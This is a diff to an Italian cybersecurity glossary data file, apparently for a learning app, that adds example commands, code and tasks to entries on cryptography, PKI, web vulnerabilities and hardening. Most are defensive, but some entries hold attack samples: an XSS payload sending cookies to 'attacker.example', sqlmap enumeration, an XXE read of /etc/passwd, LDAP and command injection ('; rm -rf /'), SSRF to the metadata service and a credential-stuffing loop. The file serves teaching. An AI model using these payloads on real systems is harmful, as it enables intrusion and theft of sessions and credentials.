+              task: `Genera una coppia di chiavi ECC sulla curva P-256, piu' compatta a parita' di sicurezza rispetto a RSA.`,
             },
             {
               english: 'Diffie-Hellman',
@@ -2080,6 +2507,13 @@ export default {
               context: 'cryptography',
               difficulty: 'advanced',
               note: 'Permette di scambiare una chiave simmetrica in modo sicuro su un canale insicuro.',
+              command: 'openssl dhparam -out dhparams.pem 2048',
+              code: `from cryptography.hazmat.primitives.asymmetric import dh
+params = dh.generate_parameters(generator=2, key_size=2048)
+alice_priv = params.generate_private_key()
+bob_priv = params.generate_private_key()
+shared = alice_priv.exchange(bob_priv.public_key())`,
+              task: 'Genera parametri Diffie-Hellman a 2048 bit per stabilire una chiave di sessione condivisa su canale insicuro.',
             },
             {
               english: 'PGP (Pretty Good Privacy)',
@@ -2090,6 +2524,8 @@ export default {
                 "Journalists and whistleblowers often sign and encrypt sensitive emails with PGP to ensure confidentiality and verify the sender's identity. = Giornalisti e informatori spesso firmano e cifrano email sensibili con PGP per garantire la riservatezza e verificare l'identità del mittente.",
               context: 'cryptography',
               difficulty: 'intermediate',
+              command: 'gpg --encrypt --recipient alice@example.com --armor messaggio.txt',
+              task: 'Cifra un messaggio con PGP usando la chiave pubblica della destinataria, producendo output ASCII armor.',
             },
             {
               english: 'Forward Secrecy',
@@ -2101,6 +2537,9 @@ export default {
               context: 'cryptography',
               difficulty: 'advanced',
               note: 'Usa chiavi temporanee (effimere) per ogni sessione invece di una sola chiave fissa.',
+              command:
+                'openssl s_client -connect example.com:443 -cipher ECDHE-RSA-AES256-GCM-SHA384',
+              task: 'Negozia una connessione TLS forzando una cipher suite ECDHE per garantire la forward secrecy della sessione.',
             },
             {
               english: 'GPG (GNU Privacy Guard)',
@@ -2111,6 +2550,8 @@ export default {
                 "GPG is the open-source alternative to PGP. = GPG \u00E8 l'alternativa open source a PGP.",
               context: 'cryptography',
               difficulty: 'intermediate',
+              command: 'gpg --full-generate-key',
+              task: 'Avvia la procedura interattiva di GPG per generare una nuova coppia di chiavi OpenPGP.',
             },
           ],
         },
@@ -2129,6 +2570,11 @@ export default {
               context: 'cryptography',
               difficulty: 'beginner',
               note: 'Funzione unidirezionale (one-way). Trasforma dati di qualsiasi dimensione in una stringa fissa.',
+              command: 'sha256sum payload.exe',
+              code: `import hashlib
+h = hashlib.sha256(b'contenuto da hashare').hexdigest()
+print(h)`,
+              task: `Calcola l'hash SHA-256 di un file scaricato per verificarne l'integrita' contro il checksum pubblicato.`,
             },
             {
               english: 'Message Digest',
@@ -2139,6 +2585,11 @@ export default {
                 'The hash function generates a message digest. = La funzione di hash genera un digest del messaggio.',
               context: 'cryptography',
               difficulty: 'intermediate',
+              command: 'openssl dgst -sha256 documento.pdf',
+              code: `import hashlib
+digest = hashlib.sha256(open('documento.pdf', 'rb').read()).digest()
+print(digest.hex())`,
+              task: 'Produci il message digest SHA-256 di un documento PDF da allegare alla firma digitale.',
             },
             {
               english: 'Collision',
@@ -2150,6 +2601,11 @@ export default {
               context: 'cryptography',
               difficulty: 'advanced',
               note: 'Rende un algoritmo di hash insicuro e vulnerabile ad attacchi.',
+              code: `import hashlib
+h1 = hashlib.md5(b'input_a').hexdigest()
+h2 = hashlib.md5(b'input_b').hexdigest()
+print('collisione!' if h1 == h2 else 'distinti')`,
+              task: 'Confronta gli hash MD5 di due input per illustrare il problema delle collisioni, ormai documentate su MD5.',
             },
             {
               english: 'SHA-256 (Secure Hash Algorithm)',
@@ -2161,6 +2617,11 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: 'Usato in Bitcoin, nei certificati SSL e in molte app di sicurezza.',
+              command: `echo -n 'ciao mondo' | sha256sum`,
+              code: `import hashlib
+h = hashlib.sha256(b'ciao mondo').hexdigest()
+print(h)`,
+              task: `Calcola l'hash SHA-256 di una stringa di test e confrontalo con il valore atteso noto.`,
             },
             {
               english: 'MD5 (Message Digest 5)',
@@ -2171,6 +2632,11 @@ export default {
                 'Do not use MD5 for security as it is prone to collisions. = Non usare MD5 per la sicurezza perch\u00E9 vulnerabile alle collisioni.',
               context: 'cryptography',
               difficulty: 'beginner',
+              command: 'md5sum legacy.iso',
+              code: `import hashlib
+h = hashlib.md5(b'attenzione: insicuro').hexdigest()
+print(h)`,
+              task: `Calcola l'hash MD5 di un'immagine legacy solo per controllo di integrita' non crittografica.`,
             },
             {
               english: 'Salt',
@@ -2182,6 +2648,11 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: 'Stringa casuale aggiunta per evitare attacchi di tipo "rainbow table".',
+              code: `import hashlib, os
+salt = os.urandom(16)
+h = hashlib.pbkdf2_hmac('sha256', b'password123', salt, 100000)
+print(salt.hex(), h.hex())`,
+              task: `Aggiungi un salt casuale di 16 byte alla password prima di derivare l'hash con PBKDF2-HMAC-SHA256.`,
             },
             {
               english: 'Pepper',
@@ -2192,6 +2663,11 @@ export default {
                 'Unlike salt, a pepper is secret and not stored in the DB. = A differenza del salt, il pepper \u00E8 segreto e non salvato nel DB.',
               context: 'cryptography',
               difficulty: 'advanced',
+              code: `import hashlib, os
+pepper = os.environ['APP_PEPPER'].encode()
+salt = os.urandom(16)
+h = hashlib.pbkdf2_hmac('sha256', b'pwd' + pepper, salt, 100000)`,
+              task: `Combina la password con un pepper segreto letto da variabile d'ambiente prima dell'hashing PBKDF2.`,
             },
             {
               english: 'digital signature verification',
@@ -2203,6 +2679,8 @@ export default {
               context: 'cryptography',
               difficulty: 'intermediate',
               note: 'I package manager moderni (apt, dnf, pacman) eseguono la verifica automaticamente con le chiavi GPG dei repo.',
+              command: 'gpg --verify pacchetto.tar.gz.sig pacchetto.tar.gz',
+              task: 'Verifica la firma digitale GPG di un archivio scaricato contro la chiave pubblica del maintainer.',
             },
             {
               english: 'Non-repudiation',
@@ -2224,6 +2702,12 @@ export default {
                 "HMAC uses a secret key and a hash function. = L'HMAC usa una chiave segreta e una funzione di hash.",
               context: 'cryptography',
               difficulty: 'advanced',
+              command: `openssl dgst -sha256 -hmac 'chiave_segreta' messaggio.txt`,
+              code: `import hmac, hashlib
+key = b'chiave_segreta'
+tag = hmac.new(key, b'messaggio', hashlib.sha256).hexdigest()
+print(tag)`,
+              task: `Calcola un HMAC-SHA256 di un messaggio con una chiave segreta per garantirne autenticita' e integrita'.`,
             },
           ],
         },
@@ -2253,6 +2737,8 @@ export default {
               context: 'trust-infrastructure',
               difficulty: 'intermediate',
               note: 'Entit\u00E0 fidata che emette e firma i certificati digitali.',
+              command: `openssl req -x509 -newkey rsa:4096 -keyout ca.key -out ca.pem -days 3650 -subj '/CN=MyInternalCA'`,
+              task: 'Crea un certificato radice di CA interna autofirmato valido dieci anni, con chiave RSA-4096.',
             },
             {
               english: 'RA (Registration Authority)',
@@ -2274,6 +2760,8 @@ export default {
               context: 'management',
               difficulty: 'advanced',
               note: 'Messaggio inviato alla CA per richiedere un certificato digitale.',
+              command: `openssl req -new -newkey rsa:2048 -nodes -keyout server.key -out server.csr -subj '/CN=app.example.com'`,
+              task: 'Genera una CSR con una nuova chiave RSA-2048 da inviare alla CA per ottenere il certificato del server.',
             },
             {
               english: 'X.509',
@@ -2285,6 +2773,8 @@ export default {
               context: 'standards',
               difficulty: 'advanced',
               note: 'Il formato standard dei certificati digitali (usato anche per HTTPS).',
+              command: 'openssl x509 -in cert.pem -text -noout',
+              task: `Ispeziona tutti i campi di un certificato X.509 per controllare subject, issuer, validita' ed estensioni.`,
             },
             {
               english: 'CRL (Certificate Revocation List)',
@@ -2296,6 +2786,8 @@ export default {
               context: 'management',
               difficulty: 'advanced',
               note: 'Una "lista nera" di certificati che non sono pi\u00F9 validi.',
+              command: 'openssl crl -in ca.crl -text -noout',
+              task: 'Stampa il contenuto leggibile di una Certificate Revocation List per ispezionare i seriali revocati.',
             },
             {
               english: 'OCSP (Online Certificate Status Protocol)',
@@ -2306,6 +2798,9 @@ export default {
                 "OCSP is faster than CRL for revocation checking. = L'OCSP \u00E8 pi\u00F9 veloce della CRL per il controllo delle revoche.",
               context: 'protocols',
               difficulty: 'advanced',
+              command:
+                'openssl ocsp -issuer issuer.pem -cert leaf.pem -url http://ocsp.example.com -text',
+              task: 'Interroga il responder OCSP della CA per verificare in tempo reale lo stato di revoca di un certificato.',
             },
             {
               english: 'Root Certificate',
@@ -2317,6 +2812,8 @@ export default {
               context: 'trust-infrastructure',
               difficulty: 'intermediate',
               note: 'La base di tutta la fiducia digitale; se questo \u00E8 compromesso, tutto crolla.',
+              command: `openssl x509 -in /etc/ssl/certs/ca-certificates.crt -text -noout | grep 'Issuer:' | head`,
+              task: 'Esplora i certificati radice fidati dal sistema per individuare quali CA sono installate di default.',
             },
             {
               english: 'Intermediate Certificate',
@@ -2328,6 +2825,8 @@ export default {
                 'Browsers complain when the server forgets to send the intermediate certificate alongside its leaf cert. = I browser si lamentano quando il server dimentica di inviare il certificato intermedio insieme al cert foglia.',
               context: 'trust-infrastructure',
               difficulty: 'advanced',
+              command: 'openssl s_client -connect example.com:443 -showcerts < /dev/null',
+              task: `Scarica l'intera catena TLS di un server per verificare che invii anche i certificati intermedi insieme al foglia.`,
             },
             {
               english: 'Trust Chain',
@@ -2338,6 +2837,8 @@ export default {
                 "Verify the whole trust chain before proceeding. = Verifica l'intera catena di fiducia prima di procedere.",
               context: 'trust-infrastructure',
               difficulty: 'intermediate',
+              command: 'openssl verify -CAfile ca.pem -untrusted intermediate.pem leaf.pem',
+              task: `Verifica che il certificato foglia possa essere validato risalendo l'intera catena di fiducia fino alla CA radice.`,
             },
           ],
         },
@@ -2362,6 +2863,12 @@ export default {
               context: 'web-vulnerabilities',
               difficulty: 'intermediate',
               note: "Consiste nell'inserire codice SQL malevolo nei campi di input per manipolare le query del database.",
+              command: 'sqlmap -u "http://target.com/page?id=1" --dbs --batch',
+              code: `# VULNERABILE - solo a scopo didattico
+user_input = "1' OR '1'='1"
+query = f"SELECT * FROM users WHERE id = '{user_input}'"
+print(query)`,
+              task: 'Esegui una scansione SQLMap automatizzata contro un parametro vulnerabile per enumerare i database disponibili.',
             },
             {
               english: 'Cross-Site Scripting (XSS)',
@@ -2373,6 +2880,10 @@ export default {
               context: 'web-vulnerabilities',
               difficulty: 'intermediate',
               note: 'Iniezione di script malevoli (solitamente JavaScript) nelle pagine web visualizzate da altri utenti.',
+              code: `# Payload XSS classico - solo a scopo didattico
+payload = "<script>fetch('https://attacker.example/?c=' + document.cookie)</script>"
+print(f'<input value="{payload}">')`,
+              task: `Costruisci un payload XSS minimale che esfiltra i cookie di sessione verso un endpoint controllato dall'attaccante.`,
             },
             {
               english: 'Stored XSS',
@@ -2384,6 +2895,10 @@ export default {
               context: 'web-vulnerabilities',
               difficulty: 'advanced',
               note: 'Molto pericoloso: lo script colpisce chiunque visiti la pagina infetta.',
+              code: `# Stored XSS - input salvato nel DB e riproposto a tutti gli utenti
+comment = "<img src=x onerror=alert('XSS')>"
+# Backend salva comment cosi' com'e' e lo mostra ad ogni visita`,
+              task: 'Simula la persistenza di un payload XSS in un campo commento, mostrando come colpisca ogni visitatore della pagina.',
             },
             {
               english: 'Reflected XSS',
@@ -2395,6 +2910,12 @@ export default {
               context: 'web-vulnerabilities',
               difficulty: 'advanced',
               note: 'Lo script non \u00E8 salvato nel server, ma viene "riflesso" immediatamente tramite un parametro (es. nell\'URL).',
+              code: `# Reflected XSS via parametro URL
+import urllib.parse
+payload = "<script>alert('riflesso')</script>"
+url = f"https://vuln.example/search?q={urllib.parse.quote(payload)}"
+print(url)`,
+              task: 'Costruisci un URL malevolo che riflette uno script nella pagina dei risultati di ricerca di un sito vulnerabile.',
             },
             {
               english: 'DOM-based XSS',
@@ -2405,6 +2926,11 @@ export default {
                 "DOM XSS happens entirely on the client side. = L'XSS nel DOM avviene interamente sul lato client.",
               context: 'web-vulnerabilities',
               difficulty: 'advanced',
+              code: `// DOM XSS - il client legge da location.hash e scrive nel DOM
+const raw = location.hash.substring(1);
+document.getElementById('out').innerHTML = raw; // vulnerabile
+// Visita la pagina con #<img src=x onerror=alert(1)>`,
+              task: 'Riproduci un DOM-based XSS che sfrutta location.hash inserito senza sanitizzazione tramite innerHTML.',
             },
             {
               english: 'Command Injection',
@@ -2415,6 +2941,11 @@ export default {
               context: 'web-vulnerabilities',
               difficulty: 'intermediate',
               note: "Permette di eseguire comandi del sistema operativo attraverso un'applicazione vulnerabile.",
+              code: `# VULNERABILE - non usare in produzione
+import os
+filename = request.args['file']  # es. "; rm -rf /"
+os.system(f'cat {filename}')`,
+              task: `Mostra come passare l'input utente direttamente a os.system permetta l'iniezione di comandi shell arbitrari.`,
             },
             {
               english: 'LDAP Injection',
@@ -2426,6 +2957,12 @@ export default {
                 "An attacker can exploit LDAP injection to bypass login forms that query directory services. = Un attaccante può sfruttare l'iniezione LDAP per aggirare i form di login che interrogano servizi di directory.",
               context: 'web-vulnerabilities',
               difficulty: 'advanced',
+              code: `# Payload LDAP injection per bypass di login
+user = "*)(uid=*"
+password = "anything"
+filter_str = f"(&(uid={user})(userPassword={password}))"
+# Il filtro diventa permissivo e autentica chiunque`,
+              task: `Costruisci un filtro LDAP malformato che bypassa l'autenticazione manipolando il filtro di ricerca delle credenziali.`,
             },
             {
               english: 'XML External Entity (XXE)',
@@ -2438,6 +2975,12 @@ export default {
               context: 'web-vulnerabilities',
               difficulty: 'advanced',
               note: 'Sfrutta i parser XML per leggere file locali o scansionare la rete interna.',
+              code: `# Payload XXE che legge /etc/passwd dal server vulnerabile
+payload = '''<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<data>&xxe;</data>'''
+# Inviare come body XML al parser vulnerabile`,
+              task: `Crea un payload XXE che dichiara un'entita' esterna puntando a /etc/passwd per esfiltrarne il contenuto.`,
             },
             {
               english: 'Sanitization',
@@ -2449,6 +2992,11 @@ export default {
               context: 'defense',
               difficulty: 'intermediate',
               note: "Rimuovere o neutralizzare caratteri pericolosi dall'input dell'utente.",
+              code: `import bleach
+untrusted = '<script>alert(1)</script><b>ok</b>'
+safe = bleach.clean(untrusted, tags=['b', 'i'], strip=True)
+print(safe)  # <b>ok</b>`,
+              task: 'Sanifica una stringa HTML non fidata con bleach mantenendo solo i tag di formattazione consentiti.',
             },
             {
               english: 'Parameterized Query',
@@ -2461,6 +3009,12 @@ export default {
               context: 'defense',
               difficulty: 'intermediate',
               note: 'La difesa principale contro SQL Injection: separa i dati dal codice della query.',
+              code: `import sqlite3
+conn = sqlite3.connect('app.db')
+cur = conn.cursor()
+# Parametrizzazione: l'input non viene mai interpretato come SQL
+cur.execute('SELECT * FROM users WHERE name = ?', (user_input,))`,
+              task: `Riscrivi una query usando il placeholder parametrizzato del driver per neutralizzare l'iniezione SQL.`,
             },
           ],
         },
@@ -2479,6 +3033,12 @@ export default {
               context: 'web-security',
               difficulty: 'intermediate',
               note: "Come l'applicazione mantiene lo stato di login tra diverse richieste HTTP.",
+              code: `from flask import session
+import secrets
+session.permanent = True
+session['user_id'] = user.id
+session['csrf'] = secrets.token_urlsafe(32)`,
+              task: `Inizializza una sessione lato server salvando l'ID utente e un token CSRF generato in modo crittograficamente sicuro.`,
             },
             {
               english: 'Session Hijacking',
@@ -2490,6 +3050,9 @@ export default {
               context: 'web-vulnerabilities',
               difficulty: 'intermediate',
               note: 'Un attaccante ruba il Session ID di un utente per spacciarsi per lui.',
+              command:
+                'curl -H "Cookie: sessionid=RUBATO_DA_ATTACCANTE" https://app.example.com/account',
+              task: 'Simula un dirottamento di sessione riproducendo manualmente un cookie rubato in una richiesta autenticata.',
             },
             {
               english: 'Session Fixation',
@@ -2499,6 +3062,13 @@ export default {
               example: `Always regenerate the session ID after login to defeat session fixation attacks against the application. = Rigenera sempre l'ID di sessione dopo il login per sconfiggere gli attacchi di session fixation contro l'applicazione.`,
               context: 'web-vulnerabilities',
               difficulty: 'advanced',
+              code: `from flask import session
+# Dopo un login riuscito rigenera l'ID di sessione
+old_data = dict(session)
+session.clear()
+session.update(old_data)
+session.modified = True`,
+              task: `Rigenera l'ID di sessione subito dopo il login per neutralizzare gli attacchi di session fixation.`,
             },
             {
               english: 'HttpOnly Cookie',
@@ -2511,6 +3081,9 @@ export default {
               context: 'defense',
               difficulty: 'intermediate',
               note: 'Protezione fondamentale contro il furto di cookie tramite XSS.',
+              command: `curl -I https://app.example.com/login | grep -i 'set-cookie'`,
+              code: `response.set_cookie('session', token, httponly=True, secure=True, samesite='Strict')`,
+              task: 'Imposta il cookie di sessione con il flag HttpOnly per impedire a script client-side di accedervi tramite document.cookie.',
             },
             {
               english: 'JWT (JSON Web Token)',
@@ -2522,6 +3095,11 @@ export default {
               context: 'web-security',
               difficulty: 'intermediate',
               note: 'Un token compatto e sicuro per trasmettere informazioni tra le parti.',
+              code: `import jwt
+token = jwt.encode({'user': 'alice', 'role': 'admin'}, 'mysecret', algorithm='HS256')
+print(token)
+claims = jwt.decode(token, 'mysecret', algorithms=['HS256'])`,
+              task: 'Emetti un token JWT firmato HS256 con claim utente e ruolo, poi verificalo decodificandolo con la stessa chiave segreta.',
             },
             {
               english: 'OAuth 2.0',
@@ -2534,6 +3112,8 @@ export default {
               context: 'web-security',
               difficulty: 'advanced',
               note: 'Usato per il "Login con Google/Facebook" senza condividere la password.',
+              command: `curl -X POST https://auth.example.com/oauth/token -d 'grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://app/cb&client_id=CID&client_secret=CS'`,
+              task: `Scambia un authorization code per un access token contro l'endpoint OAuth 2.0 del provider di identita'.`,
             },
             {
               english: 'OpenID Connect (OIDC)',
@@ -2545,6 +3125,8 @@ export default {
                 "OIDC adds an identity layer on top of OAuth 2.0. = L'OIDC aggiunge un livello di identit\u00E0 sopra OAuth 2.0.",
               context: 'web-security',
               difficulty: 'advanced',
+              command: `curl https://accounts.google.com/.well-known/openid-configuration | jq '.authorization_endpoint, .token_endpoint, .jwks_uri'`,
+              task: 'Scarica il documento di discovery OIDC del provider per trovare gli endpoint di autorizzazione, token e JWKS.',
             },
             {
               english: 'SAML (Security Assertion Markup Language)',
@@ -2556,6 +3138,8 @@ export default {
               context: 'web-security',
               difficulty: 'advanced',
               note: 'Basato su XML, usato per scambiare dati di autenticazione e autorizzazione.',
+              command: `curl https://idp.example.com/saml/metadata > idp-metadata.xml && xmllint --xpath '//*[local-name()="SingleSignOnService"]/@Location' idp-metadata.xml`,
+              task: `Scarica i metadati SAML dell'identity provider e estrai l'URL dell'endpoint SingleSignOnService.`,
             },
             {
               english: 'Credential Stuffing',
@@ -2566,6 +3150,13 @@ export default {
               context: 'threats',
               difficulty: 'intermediate',
               note: 'Termine inglese usato anche in italiano: indica il riutilizzo automatizzato di credenziali rubate da altri data breach.',
+              code: `# Pattern di credential stuffing - SIMULAZIONE DIFENSIVA
+import requests
+for user, pwd in leaked_pairs:  # da un breach pubblico
+    r = requests.post('https://app.example/login', data={'u': user, 'p': pwd})
+    if r.status_code == 200:
+        log_compromise(user)`,
+              task: 'Simula il pattern di un attacco di credential stuffing per testare MFA e rate limiting del tuo endpoint di login.',
             },
             {
               english: 'Secure Cookie',
@@ -2576,6 +3167,8 @@ export default {
                 'The secure flag ensures the cookie is sent only over HTTPS. = Il flag secure garantisce che il cookie sia inviato solo via HTTPS.',
               context: 'defense',
               difficulty: 'beginner',
+              code: `response.set_cookie('session', token, secure=True, httponly=True, samesite='Lax')`,
+              task: `Imposta il flag Secure sul cookie di sessione cosi' che venga inviato esclusivamente su connessioni HTTPS.`,
             },
           ],
         },
@@ -2605,6 +3198,12 @@ export default {
               context: 'owasp-top-10',
               difficulty: 'intermediate',
               note: 'Vulnerabilit\u00E0 che permette di accedere a risorse fuori dai propri permessi.',
+              code: `# VULNERABILE - manca il controllo di autorizzazione
+@app.route('/api/user/<uid>/profile')
+def profile(uid):
+    # Nessun controllo che current_user.id == uid: IDOR!
+    return db.users.find_one({'id': uid})`,
+              task: 'Mostra come la mancanza di un controllo di autorizzazione lato server permetta a un utente di accedere ai profili altrui (IDOR).',
             },
             {
               english: 'Cryptographic Failures',
@@ -2639,6 +3238,11 @@ export default {
                 'Leaving default passwords is a common misconfiguration. = Lasciare le password di default \u00E8 un errore di configurazione comune.',
               context: 'owasp-top-10',
               difficulty: 'intermediate',
+              command: `curl -I https://app.example.com/admin | grep -iE 'server:|x-powered-by:'`,
+              code: `# VULNERABILE - debug attivo in produzione
+app.run(host='0.0.0.0', debug=True)
+# Espone interactive console su errori, esecuzione remota di codice`,
+              task: 'Verifica con curl se il server espone header informativi che rivelano stack tecnologico e versioni a un attaccante.',
             },
             {
               english: 'Vulnerable and Outdated Components',
@@ -2650,6 +3254,8 @@ export default {
                 'Update your libraries to avoid vulnerable components. = Aggiorna le tue librerie per evitare componenti vulnerabili.',
               context: 'owasp-top-10',
               difficulty: 'intermediate',
+              command: 'pip-audit -r requirements.txt',
+              task: `Esegui pip-audit contro il file delle dipendenze per identificare librerie con vulnerabilita' CVE note.`,
             },
             {
               english: 'Identification and Authentication Failures',
@@ -2694,6 +3300,12 @@ export default {
               context: 'owasp-top-10',
               difficulty: 'advanced',
               note: 'Nuova entrata importante nella Top 10 (2021).',
+              code: `# VULNERABILE - SSRF su metadata endpoint AWS
+import requests
+url = request.args['url']  # es. http://169.254.169.254/latest/meta-data/
+r = requests.get(url)  # legge credenziali IAM dal metadata service
+return r.text`,
+              task: 'Mostra come un fetch lato server senza allowlist permetta di leggere il metadata service interno del cloud provider.',
             },
           ],
         },
@@ -2711,6 +3323,8 @@ export default {
               context: 'defense-tools',
               difficulty: 'intermediate',
               note: 'OWASP CRS è il ruleset open source di riferimento per i WAF basati su ModSecurity e Coraza.',
+              command: `curl -i 'https://app.example.com/?q=<script>alert(1)</script>'`,
+              task: 'Invia una richiesta con payload XSS evidente per verificare che il ruleset OWASP CRS del WAF la blocchi con 403.',
             },
             {
               english: 'Content Security Policy (CSP)',
@@ -2723,6 +3337,9 @@ export default {
               context: 'defense',
               difficulty: 'advanced',
               note: 'Header HTTP che indica al browser quali script e risorse sono autorizzati a girare sulla pagina.',
+              command: `curl -I https://app.example.com/ | grep -i 'content-security-policy'`,
+              code: `response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'nonce-abc123'; object-src 'none'"`,
+              task: 'Imposta un header CSP rigoroso che permetta solo script dello stesso origine con nonce e blocchi gli oggetti embedded.',
             },
             {
               english: 'HSTS (HTTP Strict Transport Security)',
@@ -2733,6 +3350,9 @@ export default {
                 "HSTS forces the browser to use HTTPS only. = L'HSTS forza il browser a usare solo HTTPS.",
               context: 'defense',
               difficulty: 'intermediate',
+              command: `curl -I https://example.com | grep -i 'strict-transport-security'`,
+              code: `response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload'`,
+              task: 'Configura un header HSTS valido un anno con includeSubDomains per forzare il browser a usare solo HTTPS.',
             },
             {
               english: 'CSRF Token',
@@ -2745,6 +3365,12 @@ export default {
               context: 'defense',
               difficulty: 'intermediate',
               note: "Un codice segreto unico per ogni richiesta che conferma l'intenzionalit\u00E0 dell'utente.",
+              code: `import secrets
+from flask import session
+session['csrf'] = secrets.token_urlsafe(32)
+# Nel form HTML: <input type='hidden' name='csrf' value='{{ session.csrf }}'>
+# Sul server, rifiuta richieste POST senza un token che corrisponde`,
+              task: 'Genera un token CSRF unico per la sessione e iniettalo nei form per rifiutare richieste POST non legittime.',
             },
             {
               english: 'Rate Limiting',
@@ -2756,6 +3382,15 @@ export default {
               context: 'defense',
               difficulty: 'intermediate',
               note: 'Limitare il numero di richieste che un utente pu\u00F2 fare in un certo tempo.',
+              code: `from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+limiter = Limiter(get_remote_address, app=app, default_limits=['200 per hour'])
+
+@app.route('/login', methods=['POST'])
+@limiter.limit('5 per minute')
+def login():
+    pass`,
+              task: `Applica un limite di cinque tentativi al minuto sull'endpoint di login per ostacolare attacchi di forza bruta.`,
             },
             {
               english: 'SameSite Cookie Attribute',
@@ -2766,6 +3401,8 @@ export default {
                 "Setting the SameSite cookie attribute to Strict prevents the browser from sending cookies in cross-site requests. = Impostare l'attributo SameSite del cookie su Strict impedisce al browser di inviare cookie in richieste cross-site.",
               context: 'defense',
               difficulty: 'advanced',
+              code: `response.set_cookie('session', token, samesite='Strict', secure=True, httponly=True)`,
+              task: `Imposta l'attributo SameSite a Strict sul cookie di sessione per impedire che venga inviato in richieste cross-site.`,
             },
             {
               english: 'Input Validation',
@@ -2777,6 +3414,14 @@ export default {
                 "Never trust user input; always perform validation. = Mai fidarsi dell'input utente; esegui sempre la validazione.",
               context: 'defense',
               difficulty: 'beginner',
+              code: `from pydantic import BaseModel, EmailStr, conint
+
+class SignupReq(BaseModel):
+    email: EmailStr
+    age: conint(ge=18, le=120)
+
+req = SignupReq(**request.json)  # solleva eccezione se invalido`,
+              task: `Valida l'input del form di registrazione con pydantic rifiutando email malformate ed eta' fuori dal range consentito.`,
             },
             {
               english: 'Output Encoding',
@@ -2787,6 +3432,11 @@ export default {
               context: 'defense',
               difficulty: 'intermediate',
               note: 'Trasformare i caratteri speciali (es. < in &lt;) prima di visualizzarli.',
+              code: `import html
+untrusted = '<script>alert(1)</script>'
+safe = html.escape(untrusted)
+print(safe)  # &lt;script&gt;alert(1)&lt;/script&gt;`,
+              task: `Esegui l'output encoding HTML su una stringa non fidata prima di renderizzarla, neutralizzando l'XSS riflesso.`,
             },
             {
               english: 'CORS (Cross-Origin Resource Sharing)',
@@ -2797,6 +3447,10 @@ export default {
                 "Setting the Access-Control-Allow-Origin header to wildcard (*) in a misconfigured CORS policy can expose internal APIs to any website on the internet. = Impostare l'header Access-Control-Allow-Origin su wildcard (*) in una policy CORS mal configurata pu\u00F2 esporre API interne a qualsiasi sito web su internet.",
               context: 'web-security',
               difficulty: 'intermediate',
+              command: `curl -i -H 'Origin: https://evil.example' https://api.example.com/data | grep -i 'access-control'`,
+              code: `from flask_cors import CORS
+CORS(app, resources={r'/api/*': {'origins': ['https://app.example.com']}}, supports_credentials=True)`,
+              task: 'Verifica con curl quali origini la tua API accetta tramite gli header Access-Control-Allow-Origin restituiti.',
             },
             {
               english: 'Security Headers',
@@ -2807,6 +3461,8 @@ export default {
                 'Configure security headers to harden your web server. = Configura gli header di sicurezza per rafforzare il tuo web server.',
               context: 'defense',
               difficulty: 'intermediate',
+              command: `curl -I https://app.example.com/ | grep -iE 'x-frame|x-content|referrer|content-security|strict-transport'`,
+              task: 'Ispeziona tutti gli header di sicurezza di una risposta per verificare che il web server sia correttamente irrobustito.',
             },
           ],
         },
@@ -2830,6 +3486,8 @@ export default {
                 'Audit your access control policies every quarter to catch dormant accounts that still hold production privileges. = Verifica le tue policy di controllo accessi ogni trimestre per scoprire account dormienti che mantengono privilegi di produzione.',
               context: 'security-foundations',
               difficulty: 'beginner',
+              command: 'setfacl -m u:alice:rw /etc/secret.conf',
+              task: `Aggiungi una ACL POSIX che concede all'utente alice i permessi di lettura e scrittura sul file di configurazione segreto.`,
             },
             {
               english: 'Principle of Least Privilege (PoLP)',
@@ -2864,6 +3522,9 @@ export default {
                 "RBAC assigns permissions based on job roles. = L'RBAC assegna permessi in base ai ruoli lavorativi.",
               context: 'access-control-models',
               difficulty: 'intermediate',
+              command:
+                'kubectl create rolebinding dev-reader --role=pod-reader --user=alice -n staging',
+              task: `Lega il ruolo pod-reader all'utente alice nel namespace staging per applicare un modello RBAC in Kubernetes.`,
             },
             {
               english: 'Discretionary Access Control (DAC)',
@@ -2900,6 +3561,8 @@ export default {
               context: 'attack-techniques',
               difficulty: 'intermediate',
               note: 'Ottenere permessi superiori a quelli inizialmente assegnati.',
+              command: 'sudo -l -U www-data',
+              task: `Elenca i comandi che l'utente www-data puo' eseguire via sudo per individuare possibili vettori di privilege escalation.`,
             },
             {
               english: 'Vertical Escalation',
@@ -2948,6 +3611,8 @@ export default {
               example: `CIS Benchmarks give you a concrete checklist for system hardening on Linux, Windows and most cloud baselines. = I CIS Benchmark forniscono una checklist concreta per l'hardening del sistema su Linux, Windows e la maggior parte delle baseline cloud.`,
               context: 'defense-strategies',
               difficulty: 'intermediate',
+              command: 'sudo lynis audit system --quick',
+              task: 'Avvia un audit veloce di hardening con Lynis e raccogli un punteggio di partenza prima di applicare le baseline CIS.',
             },
             {
               english: 'Attack Surface',
@@ -2959,6 +3624,8 @@ export default {
               context: 'security-concepts',
               difficulty: 'intermediate',
               note: 'Il numero totale di punti in cui un attaccante pu\u00F2 tentare di entrare o estrarre dati.',
+              command: 'sudo ss -tulnp',
+              task: 'Elenca tutte le porte TCP e UDP in ascolto con il processo proprietario per mappare la superficie di attacco del server.',
             },
             {
               english: 'Attack Surface Reduction',
@@ -2970,6 +3637,8 @@ export default {
                 'Disabling unused services is an attack surface reduction technique. = Disabilitare servizi inutilizzati \u00E8 una tecnica di riduzione della superficie di attacco.',
               context: 'defense-strategies',
               difficulty: 'intermediate',
+              command: 'sudo systemctl disable --now avahi-daemon cups bluetooth',
+              task: 'Disabilita e ferma servizi non necessari su un server di produzione per ridurre la superficie di attacco.',
             },
             {
               english: 'Baseline Configuration',
@@ -2981,6 +3650,9 @@ export default {
                 'All servers must match the security baseline configuration. = Tutti i server devono corrispondere alla configurazione baseline di sicurezza.',
               context: 'defense-strategies',
               difficulty: 'intermediate',
+              command:
+                'sudo openscap-scanner --profile xccdf_org.ssgproject.content_profile_cis /usr/share/xml/scap/ssg/content/ssg-rhel9-ds.xml',
+              task: `Confronta la configurazione del sistema con la baseline CIS per RHEL 9 usando OpenSCAP e produci un report di conformita'.`,
             },
             {
               english: 'Service Disabling',
@@ -2991,6 +3663,8 @@ export default {
